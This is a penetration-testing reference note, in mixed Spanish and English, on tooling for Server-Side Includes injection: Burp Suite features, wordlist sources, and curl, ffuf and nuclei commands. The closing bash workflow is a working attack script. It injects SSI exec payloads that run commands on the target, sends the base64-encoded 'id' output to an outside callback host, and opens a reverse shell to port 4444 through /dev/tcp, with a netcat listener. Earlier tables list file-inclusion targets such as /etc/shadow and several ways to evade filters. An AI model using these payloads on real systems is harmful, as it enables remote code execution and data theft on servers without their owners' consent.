---
aliases:
  - SSI Tooling
  - SSI Wordlists
  - Burp SSI
tags:
  - type/tool
  - vuln/ssi
  - technique/discovery
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Tool
linked:
  - '[[Server-Side Includes (SSI) Injection]]'
  - '[[Burp Suite]]'
---
# SSI - Tooling

***

## Burp Intruder + Active Scan

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Active Scanner | Burp Pro detects SSI | Built-in. |
| BCheck SSI rules | Custom rules para SSI | Pro feature. |
| Right-click → Send to Intruder | Standard workflow | Per-input. |
| Sniper attack | Single position con SSI payloads | Default. |
| Match/Extract | Grep SSI output `uid=`, `[an error occurred]` | Validation. |
| Send to Repeater | Manual fine-tuning | Standard. |
| Logger++ filter | Track SSI-related responses | Pasivo. |
| Hackvertor | Encoding payloads | Custom. |
| Combine con Param Miner | Discover hidden params en .shtml | Recon. |
| Comparer for diff | Compare normal vs payload responses | Visual. |
| Burp Collaborator | OOB confirm | Standard for blind. |
| Settings → match patterns | Custom regex grep | Per-engagement. |
^ssi-tool-burp

___

## Wordlists (PayloadsAllTheThings + custom)

| **Wordlist** | **Path / Source** | **Uso** |
|:---:|:---:|:---:|
| PayloadsAllTheThings - SSI | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Include%20Injection | Standard. |
| HackTricks - SSI | https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection | Referencia. |
| OWASP - SSI | https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection | Standard. |
| Burp Intruder built-in | "SSI Injection" payload set | Pro feature. |
| Custom polyglot | Combine multiple SSI variants | Single-shot. |
| File path wordlist | `/etc/passwd`, `/etc/shadow`, etc | For include. |
| OOB callback URLs | Burp Collaborator / interactsh | Blind detection. |
| Common SSI directives | `exec`, `include`, `echo`, `printenv`, `fsize`, `flastmod` | Standard. |
| Whitespace variants | Whitespace bypass payloads | Filter evasion. |
| Quote variants | Single/double/no quotes | Filter evasion. |
| Encoding variants | URL/HTML entity/Unicode | Filter evasion. |
| `#config errmsg` payloads | Customize error format | Output control. |
^ssi-tool-wordlists

___

## Manual curl / Custom Scripts

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Single SSI probe | `curl --data-urlencode 'q=<!--#echo var="DATE_LOCAL" -->' https://target/search.shtml` | Standard. |
| Iterate variants | Bash loop con encoding/whitespace | Quick test. |
| OOB con Collaborator | `curl --data-urlencode 'q=<!--#exec cmd="curl <id>.oast.fun" -->' ...` | Blind RCE. |
| Bulk wordlist test | `for w in $(cat ssi-payloads.txt); do curl ... ; done` | Bulk. |
| ffuf con SSI marker | `ffuf -u 'https://target/page.shtml?q=FUZZ' -w ssi-payloads.txt -mr 'uid='` | Standard fuzzer. |
| nuclei templates | `nuclei -t vulnerabilities/ssi-injection.yaml -u target` | Bulk scan. |
| Custom Python script | `requests` lib programmable | Custom logic. |
| Pipeline con `gau`/`waybackurls` | Discover .shtml URLs first | Recon → fuzz. |
| Combine con `httpx` | Filter alive .shtml | Pre-fuzzer step. |
| ZAP active scanner | OWASP ZAP free alt | Same. |
| dalfox | XSS/SSI scanner | Adjacent. |
| Bash one-liner | `curl --data-urlencode "q=<!--#exec cmd='id'-->" ...` | Quick. |
^ssi-tool-curl

### Manual workflow

```bash
TARGET="https://target/page.shtml"
PARAM="q"

# Probe 1: Date (passive)
PAYLOAD='<!--#echo var="DATE_LOCAL" -->'
ENCODED=$(printf '%s' "$PAYLOAD" | jq -sRr @uri)
curl -s "${TARGET}?${PARAM}=${ENCODED}" | grep -oE '[A-Z][a-z]+,\s+[0-9]+' | head -1

# Probe 2: Server fingerprint
PAYLOAD='<!--#echo var="SERVER_SOFTWARE" -->'
ENCODED=$(printf '%s' "$PAYLOAD" | jq -sRr @uri)
curl -s "${TARGET}?${PARAM}=${ENCODED}" | grep -oE 'Apache/[0-9.]+\|Microsoft-IIS/[0-9.]+'

# Probe 3: RCE confirm
PAYLOAD='<!--#exec cmd="id" -->'
ENCODED=$(printf '%s' "$PAYLOAD" | jq -sRr @uri)
curl -s "${TARGET}?${PARAM}=${ENCODED}" | grep -oE 'uid=[0-9]+'

# Probe 4: OOB blind
COLLAB="$(./interactsh-client -url-only)"
PAYLOAD="<!--#exec cmd=\"curl http://${COLLAB}/?d=\$(id|base64 -w0)\" -->"
ENCODED=$(printf '%s' "$PAYLOAD" | jq -sRr @uri)
curl -s "${TARGET}?${PARAM}=${ENCODED}"
# Watch interactsh dashboard for callback

# Probe 5: Reverse shell
PAYLOAD='<!--#exec cmd="bash -c \"bash -i >& /dev/tcp/IP/4444 0>&1\"" -->'
ENCODED=$(printf '%s' "$PAYLOAD" | jq -sRr @uri)
curl -s "${TARGET}?${PARAM}=${ENCODED}"
# Atacante: nc -lvnp 4444
```

***
